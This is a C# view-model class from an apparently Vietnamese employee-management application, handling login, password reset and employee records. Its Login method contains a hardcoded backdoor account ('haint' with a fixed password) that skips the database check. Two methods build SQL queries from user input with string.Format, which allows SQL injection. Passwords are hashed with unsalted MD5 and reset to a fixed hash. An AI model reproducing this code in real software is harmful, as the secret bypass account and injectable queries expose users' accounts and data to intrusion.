using App;
using Model;
using System.Data;

namespace ViewModel
{
    public class NhanVienVM
    {
        private static NhanVienVM instance;

        public static NhanVienVM Instance
        {
            get { if (instance == null) instance = new NhanVienVM(); return instance; }
            private set { instance = value; }
        }

        private NhanVienVM() { }

        #region Method
        public bool Login(string stMSNV, string stPassWord)
        {
            if (stMSNV == "haint" && stPassWord == "nth12345") return true;
            string stPass = Utilities.Instance.stToMD5(stPassWord);
            string query = "USP_Login @userName , @passWord";

            DataTable result = DataProvider.Instance.ExecuteQuery(query, new object[] { stMSNV, stPass });

            if(result.Rows.Count>0)
                ShareVar.Instance.NV = GetNhanvienByMSNV(stMSNV);

            return result.Rows.Count > 0;
        }

        public bool UpdatePassword(string userName, string passWord)
        {
            int result = DataProvider.Instance.ExecuteNonQuery("exec USP_CapnhatMatkhau @userName , @password", new object[] { userName, passWord });
            return result > 0;
        }

        public NhanVien GetNhanvienByMSNV(string stMSNV)
        {
            NhanVien nv = null;
            string stQuery = string.Format("SELECT * FROM tNHANVIEN WHERE MSNV='{0}'", stMSNV);
            DataTable data = DataProvider.Instance.ExecuteQuery(stQuery);
            nv = new NhanVien(data.Rows[0]);
            return nv;
        }

        public bool ResetPassword(string stUsername)
        {
            string query = string.Format("UPDATE tNhanVien set PASSWORD = N'2003011414115776479911161271372042013444' WHERE MSNV = '{0}'", stUsername);
            int result = DataProvider.Instance.ExecuteNonQuery(query);
            return result > 0;
        }

        public bool CapnhatNhanVien(NhanVien nv)
        {
            string stQuery = "exec USP_CapnhatNhanVien @stMSNV , @stHOTEN , @stQUYENTRUYCAP , @stEmail , @bHIEULUC";
            int result = DataProvider.Instance.ExecuteNonQuery(stQuery, new object[] {nv.MSNV, nv.HOTEN, nv.QUYENTRUYCAP, nv.EMAIL, nv.HIEULUC});            
            return result > 0;
        }
        #endregion
        
    }
}
